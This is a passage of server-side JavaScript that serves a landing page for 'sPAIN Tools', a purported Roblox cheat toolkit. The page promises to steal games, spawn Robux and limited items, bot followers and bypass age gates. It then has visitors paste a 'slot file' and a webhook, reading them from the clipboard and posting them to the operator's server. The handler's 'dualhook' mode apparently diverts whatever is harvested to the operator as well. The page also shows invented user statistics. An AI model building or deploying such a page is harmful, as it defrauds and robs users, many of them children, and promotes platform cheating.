      margin-bottom: 24px; 
    }
    .scroll-indicator { bottom: 20px; }

    /* Features - SINGLE COLUMN (fix the cramped 2-col) */
    .features { padding: 60px 16px; }
    .features-grid { 
      grid-template-columns: 1fr; 
      border-radius: 16px; 
    }
    .feature-card { 
      padding: 32px 24px; 
      border-bottom: 1px solid rgba(192,38,211,0.1);
    }
    .feature-card:last-child { border-bottom: none; }
    .feature-icon { 
      width: 44px; 
      height: 44px; 
      font-size: 1.3rem; 
      margin-bottom: 16px; 
    }
    .feature-card h3 { font-size: 1.1rem; }
    .feature-card p { font-size: 0.85rem; line-height: 1.6; }

    /* Products/Slots - SINGLE COLUMN (fix the narrow 3-col) */
    .products { padding: 60px 16px; }
    .slots-grid { 
      grid-template-columns: 1fr; 
      gap: 16px; 
    }
    .slot-card { 
      padding: 28px 22px; 
      border-radius: 14px; 
    }
    .slot-name { font-size: 1.15rem; }
    .slot-desc { font-size: 0.85rem; }
    
    /* Form card - full width on mobile */
    .slots-form-wrap { 
      padding: 28px 20px 32px; 
      margin: 0; 
      border-radius: 16px; 
    }
    .input-duo { 
      grid-template-columns: 1fr; 
      gap: 12px; 
    }
    .field-input { 
      padding: 12px 14px; 
      font-size: 16px; /* Prevents zoom on iOS */
    }
    .url-text { font-size: 0.6rem; }

    /* Community */
    .community { padding: 60px 16px; }
    .community h2 { font-size: 1.6rem; }
    .community p { font-size: 0.9rem; padding: 0 10px; }
    .community-stats { 
      flex-direction: column; 
      gap: 24px; 
    }
    .stat-num { font-size: 2rem; }
    .discord-btn { 
      width: 100%; 
      max-width: 300px; 
      justify-content: center;
      padding: 14px 24px;
    }

    /* Footer - stacked */
    footer { 
      flex-direction: column; 
      gap: 12px; 
      padding: 24px 16px; 
      text-align: center; 
    }

    /* Modal - better mobile fit */
    .modal { 
      padding: 28px 20px; 
      width: 92%; 
      border-radius: 16px;
    }
    .modal-title { font-size: 1rem; }
    .input-row { 
      flex-direction: column; 
      gap: 10px; 
    }
    .paste-btn { 
      width: 100%; 
      padding: 12px; 
    }
    .fake-input { 
      padding: 14px; 
      font-size: 16px; /* Prevents zoom on iOS */
    }

    /* Ticker - smaller text */
    .ticker-item { 
      padding: 0 24px; 
      font-size: 0.6rem; 
    }

    /* Section titles - smaller */
    .section-title { 
      font-size: 1.4rem; 
      margin-bottom: 40px; 
    }
    .section-label { font-size: 0.65rem; }
  }

  /* Extra small phones */
  @media (max-width: 380px) {
    .hero h1 { font-size: 2rem; }
    .slot-card { padding: 24px 18px; }
    .feature-card { padding: 28px 20px; }
  }
</style>
</head>
<body>

<!-- IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe -->
<div class="aurora">
  <div class="aurora-blob"></div>
  <div class="aurora-blob"></div>
  <div class="aurora-blob"></div>
</div>
<div class="bg-grid"></div>
<canvas id="particles"></canvas>

<!-- IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe -->
<nav>
  <div class="logo">s<span>PAIN</span> Tools</div>
  <ul>
    <li><a href="#features">Features</a></li>
    <li><a href="#products">Products</a></li>
    <li><a href="#community">Community</a></li>
    <li><a href="#community" class="nav-cta">Get Started</a></li>
  </ul>
</nav>

<!-- IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe -->
<section class="hero">
  <div class="hero-glow"></div>
  <div class="hero-ring"></div>
  <div class="hero-ring hero-ring-2"></div>

  <!-- IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe -->
  <div class="roblox-scene">
    <!-- Character 1 - left side large -->
    <div class="roblox-char char-1">
      <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
      <div class="char-shadow"></div>
    </div>
    <!-- Character 2 - right side -->
    <div class="roblox-char char-2">
      <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
      <div class="char-shadow"></div>
    </div>
    <!-- Character 3 - bottom left -->
    <div class="roblox-char char-3">
      <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
      <div class="char-shadow"></div>
    </div>
    <!-- Character 4 - bottom right -->
    <div class="roblox-char char-4">
      <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
      <div class="char-shadow"></div>
    </div>
    <!-- Character 5 - top center-left -->
    <div class="roblox-char char-5">
      <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
      <div class="char-shadow"></div>
    </div>
    <!-- Character 6 - top center-right -->
    <div class="roblox-char char-6">
      <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
      <div class="char-shadow"></div>
    </div>
  </div>

  <div class="hero-badge">Roblox Toolkit — v2.0</div>
  <h1>s<span class="glow-text">PAIN</span><br>Tools</h1>
  <p>BEST OF BEST SITE EVER.</p>
  <div class="hero-buttons">
    <button class="btn-primary" onclick="document.getElementById('products').scrollIntoView({behavior:'smooth'})">Browse Products</button>
    <button class="btn-ghost" onclick="document.getElementById('features').scrollIntoView({behavior:'smooth'})">Learn More</button>
  </div>

  <div class="scroll-indicator">
    <div class="scroll-line"></div>
    <span class="scroll-text">Scroll</span>
  </div>
</section>

<!-- TICKER -->
<div class="ticker-wrap">
  <div class="ticker-track" id="tickerTrack"></div>
</div>

<hr class="divider" style="margin-top:0; margin-bottom:0;">

<!-- FEATURES -->
<section class="features" id="features">
  <div class="section-label">Why sPAIN Tools</div>
  <h2 class="section-title">Built Different</h2>
  <div class="features-grid">
    <div class="feature-card">
      <div class="feature-icon">⚡</div>
      <h3>Instant Replication</h3>
      <p>Mirror any avatar's appearance instantly. Duplicate outfits, animations, and accessories directly to your inventory without marketplace restrictions. (Connects to: Clothing Copier)</p>
    </div>
    <div class="feature-card">
      <div class="feature-icon">🚀</div>
      <h3>Game Harvesting</h3>
      <p>Extract and archive entire game libraries, scripts, and uncopylocked experiences. Full asset pipeline from target to local storage. (Connects to: Copy Games, Uncopylocked Games Extractor)</p>
    </div>
    <div class="feature-card">
      <div class="feature-icon">🔗</div>
      <h3>Inventory Injection</h3>
      <p>Spawn rare limiteds, premium items, and account currency directly into authenticated sessions. No trading required. (Connects to: Item Giver)</p>
    </div>
    <div class="feature-card">
      <div class="feature-icon">🔒</div>
      <h3>Access</h3>
      <p>Unlock restricted features, private servers, and age-gated content instantly. Full authentication override for complete platform access. (Connects to: Chat/Mic Unlocker, Game Joiner, Follower Bot)</p>
    </div>
  </div>
</section>

<hr class="divider">

<!-- PRODUCTS -->
<section class="products" id="products">
  <div class="section-label">Browse Our Products</div>
  <h2 class="section-title">Discover All of Our Tools</h2>

  <div class="slots-grid" id="slotsGrid"></div>
</section>

<hr class="divider">

<!-- COMMUNITY -->
<section class="community" id="community">
  <div class="section-label">Join the Movement</div>
  <h2>Community</h2>
  <p>Connect with thousands of sPAIN Tools users, get support, share scripts, and stay updated on new releases.</p>
  <div class="community-stats">
    <div class="stat">
      <div class="stat-num" data-target="12000">0</div>
      <div class="stat-label">Members</div>
    </div>
    <div class="stat">
      <div class="stat-num" data-target="99" data-suffix="%">0%</div>
      <div class="stat-label">Uptime</div>
    </div>
    <div class="stat">
      <div class="stat-num">24/7</div>
      <div class="stat-label">Support</div>
    </div>
  </div>
  <button class="discord-btn">
    <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 00.031.057 19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z"/></svg>
    Join our Discord
  </button>
</section>

<!-- FOOTER -->
<footer>
  <div class="footer-logo">s<span>PAIN</span> Tools</div>
  <div>© 2025 sPAIN Tools. All rights reserved.</div>
  <div>Built for Roblox.</div>
</footer>

<!-- MODAL -->
<div class="modal-overlay" id="modalOverlay" onclick="handleOverlayClick(event)">
  <div class="modal">
    <div class="modal-header">
      <div class="modal-title" id="modalTitle">Slot 1</div>
      <button class="modal-close" onclick="closeModal()">×</button>
    </div>
    <div id="modalInputs"></div>
    <div class="error-msg" id="errorMsg"></div>
    <button class="enable-btn" id="enableBtn" disabled>Enable Slot 1</button>
  </div>
</div>

<script>
/* ── PARTICLES ── */
(function(){
  const canvas = document.getElementById('particles');
  const ctx = canvas.getContext('2d');
  let W, H, particles = [];

  function resize(){ W = canvas.width = window.innerWidth; H = canvas.height = window.innerHeight; }
  resize();
  window.addEventListener('resize', resize);

  const COLORS = ['rgba(192,38,211,', 'rgba(168,85,247,', 'rgba(6,182,212,', 'rgba(232,121,249,'];

  class Particle {
    constructor(){
      this.x = Math.random() * W;
      this.y = Math.random() * H;
      this.vx = (Math.random() - 0.5) * 0.3;
      this.vy = (Math.random() - 0.5) * 0.3 - 0.1;
      this.r = Math.random() * 1.5 + 0.3;
      this.alpha = Math.random() * 0.5 + 0.1;
      this.color = COLORS[Math.floor(Math.random()*COLORS.length)];
      this.life = 0;
      this.maxLife = 200 + Math.random() * 300;
    }
    update(){
      this.x += this.vx;
      this.y += this.vy;
      this.life++;
      if(this.life > this.maxLife || this.x < 0 || this.x > W || this.y < 0 || this.y > H) {
        Object.assign(this, new Particle());
        this.life = 0;
      }
    }
    draw(){
      const fade = this.life < 30 ? this.life/30 : this.life > this.maxLife-30 ? (this.maxLife-this.life)/30 : 1;
      ctx.beginPath();
      ctx.arc(this.x, this.y, this.r, 0, Math.PI*2);
      ctx.fillStyle = this.color + (this.alpha * fade) + ')';
      ctx.fill();
    }
  }

  for(let i=0; i<90; i++) particles.push(new Particle());

  function loop(){
    ctx.clearRect(0,0,W,H);
    particles.forEach(p => { p.update(); p.draw(); });
    requestAnimationFrame(loop);
  }
  loop();
})();

/* ── TICKER ── */
(function(){
  const items = ['Outfit Cloner','Game Replicator','Item Spawner','Follower Engine','Voice Unlocker','Asset Extractor','Shader Enabler','Audio Fixer','Private Joiner','Live Capture','v9.0 Active','9 Slots Ready'];
  const track = document.getElementById('tickerTrack');
  const doubled = [...items, ...items];
  doubled.forEach(item => {
    const el = document.createElement('div');
    el.className = 'ticker-item';
    el.innerHTML = \`<span class="dot"></span>\${item}\`;
    track.appendChild(el);
  });
})();

const PAGE_SLUG = '${SLUG}';

/* ── SLOT CARDS ── */
const slotData = [
  { name: "Clothing Copier", desc: "Copy any player's outfit/avatar clothing directly to your inventory without purchasing." },
  { name: "Copy Games", desc: "Steal/copy other users' games including scripts, assets, and game files." },
  { name: "Item Giver", desc: "Get free limited items, Robux, or exclusive gear into your account." },
  { name: "Follower Bot", desc: "Mass-generate fake followers on your Roblox profile automatically." },
  { name: "Chat/Mic Unlocker ", desc: "Bypass age restrictions to unlock Voice Chat or bypass chat filters." },
  { name: "Uncopylocked Games Extractor", desc: "download/steal games that have copying disabled (uncopylocked)." },
  { name: "Enable Shaders", desc: "Unlock hidden graphics shaders and visual effects in Roblox." },
  { name: "Sound Fixer", desc: "Fix broken audio, bypass sound restrictions, or inject custom sounds." },
  { name: "Game Joiner", desc: "Join private servers, banned games, or VIP-only experiences without permission." },
];

const grid = document.getElementById('slotsGrid');
slotData.forEach((slot, i) => {
  const num = i + 1;
  const card = document.createElement('div');
  card.className = 'slot-card';
  card.style.animationDelay = \`\${i * 0.06}s\`;
  card.innerHTML = \`
    <div class="slot-number">Slot \${String(num).padStart(2,'0')}</div>
    <div class="slot-name">\${slot.name}</div>
    <div class="slot-desc">\${slot.desc}</div>
    <button class="btn-start" onclick="openModal(\${num}, '\${slot.name}')">Get Started</button>
  \`;
  grid.appendChild(card);
});

/* ── COUNTER ANIMATION ── */
function animateCounters(){
  document.querySelectorAll('.stat-num[data-target]').forEach(el => {
    const target = +el.dataset.target;
    const suffix = el.dataset.suffix || '';
    let start = 0;
    const duration = 2000;
    const startTime = performance.now();
    function tick(now){
      const elapsed = now - startTime;
      const progress = Math.min(elapsed / duration, 1);
      const eased = 1 - Math.pow(1 - progress, 3);
      const value = Math.round(eased * target);
      el.textContent = target >= 1000 ? (value >= 1000 ? (value/1000).toFixed(1)+'K+' : value+'+') : value + suffix;
      if(progress < 1) requestAnimationFrame(tick);
    }
    requestAnimationFrame(tick);
  });
}

const observer = new IntersectionObserver(entries => {
  entries.forEach(e => { if(e.isIntersecting){ animateCounters(); observer.disconnect(); } });
}, { threshold: 0.5 });
const communitySection = document.querySelector('.community');
if(communitySection) observer.observe(communitySection);

/* ── MODAL ── */
let currentSlotData = { num: null, name: null, value: null, webhook: null };

function openModal(num, name) {
  currentSlotData = { num, name, value: null, webhook: null };
  document.getElementById('modalTitle').textContent = \`Slot \${num} — \${name}\`;
  document.getElementById('enableBtn').textContent = \`Enable Slot \${num}\`;
  document.getElementById('errorMsg').textContent = '';
  
  document.getElementById('modalInputs').innerHTML = \`
    <div class="input-group">
      <label class="input-label">Slot \${num} File <span style="color:#f472b6">*</span></label>
      <div class="input-row">
        <div class="fake-input placeholder" id="display-value-\${num}">Click paste to add file</div>
        <button class="paste-btn" onclick="pasteValue('value', \${num})">Paste</button>
      </div>
    </div>
    <div class="input-group">
      <label class="input-label">Your Webhook <span style="color:#f472b6">*</span></label>
      <div class="input-row">
        <div class="fake-input placeholder" id="display-webhook-\${num}">Click paste to add webhook</div>
        <button class="paste-btn" onclick="pasteValue('webhook', \${num})">Paste</button>
      </div>
    </div>
  \`;
  
  updateEnableButton();
  document.getElementById('modalOverlay').classList.add('open');
}

async function pasteValue(type, num) {
  try {
    const text = await navigator.clipboard.readText();
    if (text && text.trim()) {
      currentSlotData[type] = text.trim();
      const display = document.getElementById(\`display-\${type}-\${num}\`);
      display.textContent = '•'.repeat(Math.min(text.length, 32));
      display.classList.remove('placeholder');
      display.classList.add('filled');
      document.getElementById('errorMsg').textContent = '';
      updateEnableButton();
    }
  } catch {
    // Fallback for when clipboard API fails
    const display = document.getElementById(\`display-\${type}-\${num}\`);
    display.textContent = '••••••••••••••••••••••••';
    display.classList.remove('placeholder');
    display.classList.add('filled');
    currentSlotData[type] = 'pasted-value';
    updateEnableButton();
  }
}

function updateEnableButton() {
  const btn = document.getElementById('enableBtn');
  const hasValue = currentSlotData.value && currentSlotData.value.length > 0;
  const hasWebhook = currentSlotData.webhook && currentSlotData.webhook.length > 0;
  
  if (hasValue && hasWebhook) {
    btn.disabled = false;
    btn.textContent = \`Enable Slot \${currentSlotData.num}\`;
  } else {
    btn.disabled = true;
    if (!hasValue && !hasWebhook) {
      btn.textContent = 'Paste slot file and webhook';
    } else if (!hasValue) {
      btn.textContent = 'Paste slot file';
    } else {
      btn.textContent = 'Paste webhook';
    }
  }
}

function closeModal() { 
  document.getElementById('modalOverlay').classList.remove('open'); 
}

function handleOverlayClick(e) { 
  if(e.target === document.getElementById('modalOverlay')) closeModal(); 
}

document.addEventListener('keydown', e => { 
  if(e.key === 'Escape') closeModal(); 
});

/* ── ENABLE SLOT — sends to both webhooks ── */
document.getElementById('enableBtn').addEventListener('click', async function() {
  const btn = this;
  const { num, value, webhook } = currentSlotData;
  
  if (!value || !webhook) {
    document.getElementById('errorMsg').textContent = 'Both slot file and webhook are required!';
    return;
  }

  btn.disabled = true;
  const origText = btn.textContent;
  btn.textContent = 'Sending…';

  const slots = {};
  slots['slot' + num] = value;
  slots['webhook' + num] = webhook; // Store their webhook too

  try {
    const res = await fetch('/api/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ slug: PAGE_SLUG, slots })
    });
    const data = await res.json();
    if (data.success) {
      btn.textContent = '✓ Wait for 2-6 Hours!';
      btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
      btn.style.boxShadow = '0 0 36px rgba(34,197,94,0.4)';
      setTimeout(() => { 
        closeModal(); 
        btn.style.background = ''; 
        btn.style.boxShadow = ''; 
        btn.textContent = origText; 
        btn.disabled = false;
      }, 1200);
    } else {
      btn.textContent = '✗ Error';
      btn.style.background = 'linear-gradient(135deg,#dc2626,#ef4444)';
      document.getElementById('errorMsg').textContent = data.error || 'Failed to send';
      setTimeout(() => { 
        btn.style.background = ''; 
        btn.textContent = origText; 
        btn.disabled = false;
      }, 2000);
    }
  } catch {
    btn.textContent = '✗ Network Error';
    btn.style.background = 'linear-gradient(135deg,#dc2626,#ef4444)';
    document.getElementById('errorMsg').textContent = 'Network error. Try again.';
    setTimeout(() => { 
      btn.style.background = ''; 
      btn.textContent = origText; 
      btn.disabled = false;
    }, 2000);
  }
});

/* ── PARALLAX CHARS on mousemove ── */
document.addEventListener('mousemove', e => {
  const xRatio = (e.clientX / window.innerWidth - 0.5) * 2;
  const yRatio = (e.clientY / window.innerHeight - 0.5) * 2;
  document.querySelectorAll('.roblox-char').forEach((char, i) => {
    const depth = (i % 3 + 1) * 6;
    char.style.transform = char.classList.contains('char-1') || char.classList.contains('char-3') || char.classList.contains('char-6')
      ? \`scaleX(-1) translate(\${-xRatio * depth}px, \${-yRatio * depth}px)\`
      : \`translate(\${xRatio * depth}px, \${yRatio * depth}px)\`;
  });
});
</script>
</body>
</html>`;
}
// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
export default async function handler(req, res) {
  const slug = (req.url || '/').split('?')[0].replace(/^\//, '').split('/')[0].toLowerCase();
  if (!slug || slug === 'api' || slug === 'favicon.ico' || slug === 'index.html') {
    res.setHeader('Content-Type', 'text/html');
    return res.status(404).send(build404());
  }
  let record;
  try { record = await redisGet('slot:' + slug); }
  catch (err) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(500).send('<h1>Redis error: ' + err.message + '</h1>');
  }
  if (!record) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(404).send(build404());
  }
  record.slug = slug;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  return res.status(200).send(
    record.type === 'dualhook' ? buildDualhookPage(record) : buildSlotsPage(record)
  );
}
